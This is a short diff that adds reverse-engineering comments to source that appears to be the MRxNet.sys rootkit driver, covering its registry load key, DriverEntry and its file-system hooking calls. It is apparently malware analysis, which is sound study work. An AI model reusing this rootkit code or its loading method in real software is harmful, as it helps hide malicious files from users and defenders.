@@ -35,6 +35,10 @@ Environment:
 //Decleration
 //------------
 
+//MRxnet.sys rootkit driver. Doesn't appear to be related to any of the main DLLs functioning, but will help it get loaded & run
+//Resource204 - rootkit driver
+//there's also Resource201 - load driver, extracted in Export16, regkey HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MRxNet\”ImagePath” = “%System%\drivers\mrxnet.sys”
+
 #include <ntifs.h>
 
 typedef struct _DEVICE_EXTENSION
@@ -143,7 +147,7 @@ VOID SetZero(PDEVICE_EXTENSION DeviceExtention,ULONG Value){
 ----------------------------------------------------------------------**/
 
 
-NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING theRegistryPath )
+NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING theRegistryPath ) //the params seem to be: ptr to the driver, and reg key where config is
 {
     int i;
     NTSTATUS status;
@@ -161,7 +165,7 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING theRegi
     DriverObject->MajorFunction[IRP_MJ_FILE_SYSTEM_CONTROL] = OnFileSystemControl;
     DriverObject->MajorFunction[IRP_MJ_DIRECTORY_CONTROL] =  OnDirectoryControl;
     SetFastIoDispatch();
-    HookingFileSystems();
+    HookingFileSystems(); //install drivers into chains
     status = IoRegisterFsRegistrationChange( DriverObject, (PDRIVER_FS_NOTIFICATION)DriverNotificationRoutine);
     if (status!=STATUS_SUCCESS){    
         IoDeleteDevice(DeviceObject);
